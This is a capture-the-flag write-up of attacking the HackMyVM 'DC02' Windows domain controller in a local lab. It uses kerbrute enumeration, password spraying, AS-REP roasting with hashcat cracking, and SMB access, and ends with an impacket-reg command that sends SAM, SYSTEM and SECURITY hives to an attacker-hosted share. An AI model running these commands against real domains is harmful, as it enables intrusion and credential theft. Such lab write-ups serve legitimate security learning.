---
title: Write-up DC02 on HackMyVM
author: eMVee
date: 2026-08-07 00:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, Windows, DC02, kerbrute, netexec, AS-REP, AS-REP-roasting, GetNPUsers, hashcat, SeBackupPrivilege, secretsdump, DCSync, DCSync-attack, secretsdump, Pass-the-Hash, pth, evil-winrm]
render_with_liquid: false
---

The momentum is strong, and I am keeping my foot on the gas. After hacking through a few easy boxes, it's now time for a medium box called DC02. A Windows environment is exactly what I need right now to see if my refreshed skills can stand up to real-world corporate configurations.

## Getting started
We are jumping straight into DC02 a vulnerable machine that can be hosted in our virtual lab. The file goes directly into VirtualBox for a seamless deployment. Before kicking off any offensive tools, let's get organized: create the workspace, verify the IP configurations, and move out.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents

┌──(emvee㉿kali)-[~/Documents]
└─$ mkdir DC02     
                                                                                                         
┌──(emvee㉿kali)-[~/Documents]
└─$ cd DC02                                                         
```

## Enumeration
Before making contact with the target, let's verify our local setup. Knowing our own IP address gives us immediate situational awareness and helps trace our footprints. We will focus strictly on the active interface, `eth0`.
```bash                                                 
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ ip a                                                                                                                                 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:24:46:73 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.3/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 564sec preferred_lft 564sec
    inet6 fe80::a00:27ff:fe24:4673/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 72:8c:6e:93:d8:3f brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-d3f1e1da70ec: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether f6:36:7d:0f:2c:32 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-d3f1e1da70ec
       valid_lft forever preferred_lft forever
    inet6 fe80::f436:7dff:fe0f:2c32/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
5: vethab05a16@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-d3f1e1da70ec state UP group default 
    link/ether 2e:b5:ce:18:f6:88 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::2cb5:ceff:fe18:f688/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
6: veth4392526@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-d3f1e1da70ec state UP group default 
    link/ether fe:15:e2:57:df:a1 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::fc15:e2ff:fe57:dfa1/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
7: veth940c74c@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-d3f1e1da70ec state UP group default 
    link/ether 42:e2:4d:54:a8:32 brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::40e2:4dff:fe54:a832/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever

```
Next, we will perform network reconnaissance using `fping` to map out active machines within our lab subnet. Based on our network segment, we execute a sweep across the entire IP range.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.12

```
Excluding the standard gateway and lab infrastructure, our active target is identified at 10.0.2.12. To streamline our workflow and save time during subsequent commands, we will store this target IP in a local environment variable.

```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ ip=10.0.2.12
```
With the target IP defined, we can proceed to port scanning. Since this is a controlled lab environment, we can run a loud Nmap scan to quickly map out all active services.

```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ sudo nmap -sC -sV -T4 -p- $ip 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-06 22:33 +0200
Nmap scan report for 10.0.2.12
Host is up (0.00073s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-07 05:35:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49699/tcp open  msrpc         Microsoft Windows RPC
49740/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:F2:8E:92 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-07T05:35:54
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f2:8e:92 (Oracle VirtualBox virtual NIC)
|_clock-skew: 8h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.59 seconds
```

The scan completed successfully and this time there are more open ports discovered. We should take a lot of notes this time. 
- Operating System: Microsoft Windows (specifically configured as a Windows Domain Controller). Not sure what version is being used.
- Domain name: SOUPEDECODE.LOCAL
- Host name: DC01

Some key open ports and services:
- Port 88 (Kerberos): Active and running Microsoft Windows Kerberos.
- Port 389 & 3268 (LDAP / Global Catalog): Active and exposing the domain structure, site layout (Default-First-Site-Name), and full domain name.
- Port 445 (SMB): Message signing is enabled and required (SMBv3.1.1), meaning basic SMB relay attacks will not work out of the box.
- Port 5985 (WinRM): HTTP-based Windows Remote Management is open, indicating a potential avenue for remote shell access if you compromise valid credentials.
- Port 9389 (ADWS): Microsoft .NET Message Framing is running, which points to the Active Directory Web Services (ADWS) management endpoint.

Let's check if we can extract any details via the SMB service using a null session.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ nxc smb $ip -u '' -p '' --users
SMB         10.0.2.12       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.12       445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 

```
The null session is blocked and does not allow us to list domain users. However, NetExec successfully extracted the exact Operating System version: `Windows Server 2022 Build 20348 x64`. Since a strict null session fails, our next step will be to test for guest user access.

Before continuing with further enumeration, we should add the target to our `/etc/hosts` file. Mapping the IP address to both the FQDN and the root domain is essential to prevent Kerberos authentication errors during later stages.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ sudo nano /etc/hosts         
[sudo] password for emvee: 

┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.12       DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Now let's enter the username guest and run the check for shares again.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --shares
SMB         10.0.2.12       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.12       445    DC01             [-] SOUPEDECODE.LOCAL\guest: STATUS_ACCOUNT_DISABLED 
```

The guest account is explicitly disabled on the system, giving us another `STATUS_ACCOUNT_DISABLED` error. With both null sessions and guest access blocked for SMB, we must pivot our focus to another service.
```bash
┌──(emvee㉿kali)-[~]
└─$ ./kerbrute userenum -d SOUPEDECODE.LOCAL --dc 10.0.2.12 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/06/26 - Ronnie Flathers @ropnop

2026/08/06 22:47:45 >  Using KDC(s):
2026/08/06 22:47:45 >   10.0.2.12:88

2026/08/06 22:47:45 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2026/08/06 22:47:45 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2026/08/06 22:47:46 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2026/08/06 22:47:46 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2026/08/06 22:47:46 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2026/08/06 22:47:54 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2026/08/06 22:47:55 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2026/08/06 22:48:40 >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2026/08/06 23:00:25 >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
```

The tool successfully enumerated several valid domain accounts. Since Kerberos usernames are case-insensitive, the wordlist matches include duplicate results with different capitalizations. In total, we discovered three unique valid users: `admin`, `charlie`, `administrator` and `wreed11`.

To manage our findings more efficiently, we can save the raw Kerbrute enumeration output into a text file named `kerbrute.txt`. 
As expected, the raw log contains several duplicate entries due to case variations. We can use a quick Bash oneliner to parse this file, extract the usernames, normalize them to lowercase, and isolate the unique results into a clean wordlist called `users.txt`.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ cat kerbrute.txt         
2026/08/06 22:47:45 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2026/08/06 22:47:45 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2026/08/06 22:47:46 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2026/08/06 22:47:46 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2026/08/06 22:47:46 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2026/08/06 22:47:54 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2026/08/06 22:47:55 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2026/08/06 22:48:40 >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2026/08/06 23:00:25 >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ grep "VALID USERNAME:" kerbrute.txt | awk '{print $NF}' | cut -d'@' -f1 | tr '[:upper:]' '[:lower:]' | sort -u > users.txt
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ cat users.txt   
admin
administrator
charlie
wreed11

```
The parsing pipeline gives us a clean list of four unique domain users. With this targeted wordlist ready, we can now proceed to our NetExec password spraying phase against the SMB service.

```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.0.2.12       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.12       445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS_LOGON_FAILURE 
SMB         10.0.2.12       445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.0.2.12       445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         10.0.2.12       445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 

```
The attack successfully discovered one valid credential pair on the target network. The user account `charlie` is using its own username as the password, resulting in a successful authentication status (`[+]`). Note that while we got a valid login, NetExec did not display a `(Pwn3d!)` banner, meaning this account likely lacks local administrative privileges on the Domain Controller.

Since port 5985 is open and running WinRM, we can try to establish an interactive remote PowerShell session using our newly acquired credentials for `charlie` with `evil-winrm`.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ evil-winrm -i DC01.SOUPEDECODE.LOCAL -u 'charlie' -p 'charlie'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\> 

whoami
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1


```
Although the initial connection interface loads, the session immediately drops with a `WinRMAuthorizationError` upon command execution. This explicit error confirms that while the credentials for `charlie` are entirely valid, the account lacks the necessary administrative permissions or membership in the "Remote Management Users" group required to interact with a remote shell on this Domain Controller.

### Kerberoasting
With valid domain credentials in hand, we can check for Kerberoasting opportunities by querying the Domain Controller for accounts with registered Service Principal Names (SPNs). We will use Impacket's `GetUserSPNs` to attempt to request service tickets that could be cracked offline.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-GetUserSPNs SOUPEDECODE.LOCAL/charlie:charlie -dc-ip 10.0.2.12
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```
The tool returned `No entries found!`, which indicates that there are no user accounts configured with an SPN in this domain. Since Kerberoasting is off the table, we should switch our focus to checking for accounts that lack Kerberos preauthentication.

### AS-REP roasting
Since our Kerberoasting attempt yielded no results, we can pivot to AS-REP Roasting using our valid domain credentials. By authenticating as `charlie`, we can query the Active Directory environment to identify any accounts that have the `Do not require Kerberos preauthentication` attribute enabled. For any vulnerable accounts discovered, the Domain Controller will return an AS-REP response containing an encrypted TGT, which we can capture and attempt to crack offline.

We will use Impacket's `GetNPUsers` to scan the domain and automatically format any recovered hashes for Hashcat.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-GetNPUsers SOUPEDECODE.LOCAL/charlie:charlie -dc-ip 10.0.2.12 -request -format hashcat -outputfile hashes.asreproast
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Name        MemberOf                                                PasswordLastSet             LastLogon                   UAC      
----------  ------------------------------------------------------  --------------------------  --------------------------  --------
zximena448  CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL  2024-06-17 20:09:53.417046  2024-07-06 01:51:16.071116  0x410200 



$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:3083eaa214aadcbc9984f49d52871174$b2d74aa9a2ab919957774d12f5f9e01ea03069c4b075d6e1886422213c78698e388596ed7fe1edeb60aa02d3312bb2a92f8e5584c8681ddb4898eb3047b0bdf7a31dafa6eed6d473b94a4302d8cbe6bc144b0baaab6e1bd827efbefc4e8f38d00050447958665cce00832e85113f6d21583ffe580d166d50fb754501b1edc17238f2719370d2f4babdb22d13ecd1e77a84b9ff40cf9bb34cb571d6811eeb67d7b826ee92ed7eccc6a53484176927ba429ae0327e491b8429e597ec2f8a1fbd5eb3f48a5ef56c75b2f0db257038c85a5532926ac7c67c915912df8455744662962581293624a2d33576cc225e6eee8523680dff2f8ba6
```
The attack successfully discovered a vulnerable account. The domain user `zximena448` has Kerberos preauthentication disabled, allowing us to capture their AS-REP hash. 

According to the output, this account is a member of the **Backup Operators** group (`CN=Backup Operators`), making it a high-value target for privilege escalation. The hash has been successfully exported to `hashes.asreproast` in Hashcat format for offline cracking.

With the AS-REP hash securely captured, we can proceed to crack it offline. We will use Hashcat with mode `18200` (specifically designed for Kerberos 5 AS-REP etype 23 hashes) and run a dictionary attack against the classic `rockyou.txt` wordlist.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ hashcat -a 0 -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 5 225U, 6974/13948 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (13940 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:3083eaa214aadcbc9984f49d52871174$b2d74aa9a2ab919957774d12f5f9e01ea03069c4b075d6e1886422213c78698e388596ed7fe1edeb60aa02d3312bb2a92f8e5584c8681ddb4898eb3047b0bdf7a31dafa6eed6d473b94a4302d8cbe6bc144b0baaab6e1bd827efbefc4e8f38d00050447958665cce00832e85113f6d21583ffe580d166d50fb754501b1edc17238f2719370d2f4babdb22d13ecd1e77a84b9ff40cf9bb34cb571d6811eeb67d7b826ee92ed7eccc6a53484176927ba429ae0327e491b8429e597ec2f8a1fbd5eb3f48a5ef56c75b2f0db257038c85a5532926ac7c67c915912df8455744662962581293624a2d33576cc225e6eee8523680dff2f8ba6:internet
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:3083eaa2...2f8ba6
Time.Started.....: Thu Aug  6 23:30:25 2026 (0 secs)
Time.Estimated...: Thu Aug  6 23:30:25 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1140.8 kH/s (2.56ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> whitetiger
Hardware.Mon.#01.: Util: 13%

Started: Thu Aug  6 23:30:11 2026
Stopped: Thu Aug  6 23:30:27 2026
```
The attack finished almost instantly. Hashcat successfully cracked the hash, revealing the cleartext password for user `zximena448`:
- Username: `zximena448`
- Password: `internet`

Now that we have compromised a user account with specialized privileges, our approach changes significantly. We have two highly critical paths to explore based on `zximena448`'s group membership:

1. WinRM Access Validation: We need to test these new credentials against the WinRM service (port 5985) using NetExec or Evil-WinRM. Unlike `charlie`, a member of the "Backup Operators" group may have direct remote management capabilities or enough administrative authority to get an interactive shell.
2. Exploiting Backup Operators Privileges: If we can establish a session, the "Backup Operators" group grants us two dangerous user rights by default: `SeBackupPrivilege` and `SeRestorePrivilege`. These allow us to bypass local file system ACLs to read any file on the system. We can leverage this to read and extract sensitive system files, including the active Active Directory database (`NTDS.dit`) and the `SYSTEM` hive, to fully compromise the domain.

First we have to get initial access before we can perform any ofthese actions. With the cracked credentials for `zximena448` in hand, we can attempt to authenticate via WinRM using `evil-winrm`. Since this user belongs to the Backup Operators group, they might have the required privileges to spawn a remote session.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ evil-winrm -i DC01.SOUPEDECODE.LOCAL -u 'zximena448' -p 'internet'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> whoami
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```
The connection successfully reaches the endpoint but terminates with a `WinRMAuthorizationError` immediately upon executing our first command (`whoami`). This confirms that despite `zximena448` possessing high-value domain rights via the Backup Operators group, the account is not explicitly granted remote management access or local administrative rights over the WinRM service on this Domain Controller.

With WinRM access restricted, we return to the SMB service to verify what privileges `zximena448` holds over the domain shares. Since this account belongs to the Backup Operators group, we expect elevated directory access.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'zximena448' -p 'internet' --shares
SMB         10.0.2.12       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.12       445    DC01             [+] SOUPEDECODE.LOCAL\zximena448:internet 
SMB         10.0.2.12       445    DC01             [*] Enumerated shares
SMB         10.0.2.12       445    DC01             Share           Permissions     Remark
SMB         10.0.2.12       445    DC01             -----           -----------     ------
SMB         10.0.2.12       445    DC01             ADMIN$          READ            Remote Admin
SMB         10.0.2.12       445    DC01             C$              READ,WRITE      Default share
SMB         10.0.2.12       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.12       445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.2.12       445    DC01             SYSVOL          READ            Logon server share 
```
The share enumeration yields a massive win for privilege escalation. Thanks to the Backup Operators role, we have explicit **READ** access to the administrative `ADMIN$` share and full **READ,WRITE** access to the root file system via the `C$` share. This confirms that we can directly read any critical system file, bypassing standard NTFS permissions.
To see if we can force remote code execution, we can test several execution tools from the Impacket suite (`psexec`, `wmiexec`, and `smbexec`). These tools rely on different administrative mechanisms to spawn a shell.

```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-psexec SOUPEDECODE.LOCAL/zximena448:internet@10.0.2.12
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.0.2.12.....
[-] share 'ADMIN\$' is not writable.
[-] share 'C\$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-wmiexec SOUPEDECODE.LOCAL/zximena448:internet@10.0.2.12
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-smbexec SOUPEDECODE.LOCAL/zximena448:internet@10.0.2.12
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

Every single remote execution method is blocked. While NetExec previously showed that our account has access to the shares, `psexec` reports that the shares are not writable under this context. Furthermore, both `wmiexec` and `smbexec` terminate with an explicit `rpc_s_access_denied` error. 

This behavior is typical when interacting with a Backup Operators account over the network. Windows enforces restrictions that prevent network logons from automatically elevating token privileges to bypass file system limitations, and it completely denies the RPC/DCOM calls required to register services or execute WMI queries.

Since our execution tools were stopped by network restrictions, we will pivot to a pure SMB connection using `smbclient`. Logging into the administrative `C$` share as `zximena448` allows us to browse the root filesystem. From here, we can test our file access limits and search for the user flag.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ smbclient //10.0.2.12/c$ -U SOUPEDECODE.LOCAL/zximena448          
Password for [SOUPEDECODE.LOCAL\zximena448]: internet
Try "help" to get a list of possible commands.
smb: \> ls
  $WinREAgent                        DH        0  Sat Jun 15 21:19:51 2024
  Documents and Settings          DHSrn        0  Sun Jun 16 04:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Fri Aug  7 08:38:04 2026
  pagefile.sys                      AHS 1476395008  Fri Aug  7 08:38:04 2026
  PerfLogs                            D        0  Sat May  8 10:15:05 2021
  Program Files                      DR        0  Sat Jun 15 19:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 11:34:13 2021
  ProgramData                       DHn        0  Sun Jun 16 04:51:08 2024
  Recovery                         DHSn        0  Sun Jun 16 04:51:08 2024
  System Volume Information         DHS        0  Sat Jun 15 21:02:21 2024
  Users                              DR        0  Mon Jun 17 20:31:08 2024
  Windows                             D        0  Sat Jun 15 21:21:10 2024

                12942591 blocks of size 4096. 10795388 blocks available
smb: \> cd users
smb: \users\> cd administrator
smb: \users\administrator\> cd desktop
cd \users\administrator\desktop\: NT_STATUS_ACCESS_DENIED
smb: \users\administrator\> cd ..
smb: \users\> cd ..
smb: \> cd users
smb: \users\> dir
  .                                  DR        0  Mon Jun 17 20:31:08 2024
  ..                                DHS        0  Fri Aug  7 08:45:05 2026
  Administrator                       D        0  Sat Jun 15 21:56:40 2024
  All Users                       DHSrn        0  Sat May  8 10:26:16 2021
  Default                           DHR        0  Sun Jun 16 04:51:08 2024
  Default User                    DHSrn        0  Sat May  8 10:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 10:14:03 2021
  Public                             DR        0  Sat Jun 15 19:54:32 2024
  zximena448                          D        0  Mon Jun 17 20:30:22 2024

                12942591 blocks of size 4096. 10795152 blocks available
smb: \users\> cd zximena448\desktop\
smb: \users\zximena448\desktop\> dir
  .                                  DR        0  Mon Jun 17 20:31:24 2024
  ..                                  D        0  Mon Jun 17 20:30:22 2024
  desktop.ini                       AHS      282  Mon Jun 17 20:30:22 2024
  user.txt                            A       33  Wed Jun 12 22:01:30 2024

                12942591 blocks of size 4096. 10795152 blocks available
smb: \users\zximena448\desktop\> get user.txt 
getting file \users\zximena448\desktop\user.txt of size 33 as user.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \users\zximena448\desktop\> exit
                                                                                               
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ cat user.txt                 
HERE IS THE USER FLAG
```
We were able to capture the user flag, but still we don't have any initial access to the system.

### Remote registry extraction via `SeBackupPrivilege`
Grabbing the user flag is a good milestone, but we can go further. As confirmed earlier, `zximena448` is a member of the Backup Operators group. This role inherently possesses the `SeBackupPrivilege`, which grants the power to bypass local NTFS access control rules specifically for backing up system registries. We can abuse this to grab local sensitive hives like `SAM`, `SYSTEM`, and `SECURITY`.

To exfiltrate these files from the Domain Controller back to our attacker machine, we will first host an open, writable SMB share on our Kali environment (`10.0.2.3`) using Impacket's `smbserver.py`.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-smbserver -smb2support share $(pwd) 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```
With our listener capturing incoming connections, we execute Impacket's `impacket-reg` utility. This script logs into the remote system, opens a named pipe connection to wake up the Remote Registry service, saves the live configuration databases, and automatically exfiltrates the hives straight over to our newly built Kali share.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-reg SOUPEDECODE.LOCAL/zximena448:internet@10.0.2.12 backup -o '\\10.0.2.3\share'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.0.2.3\share\SAM.save
[*] Saved HKLM\SYSTEM to \\10.0.2.3\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\10.0.2.3\share\SECURITY.save
```
The script successfully completes the remote export. The `SAM.save`, `SYSTEM.save`, and `SECURITY.save` hives have been written directly to our working directory on Kali. 

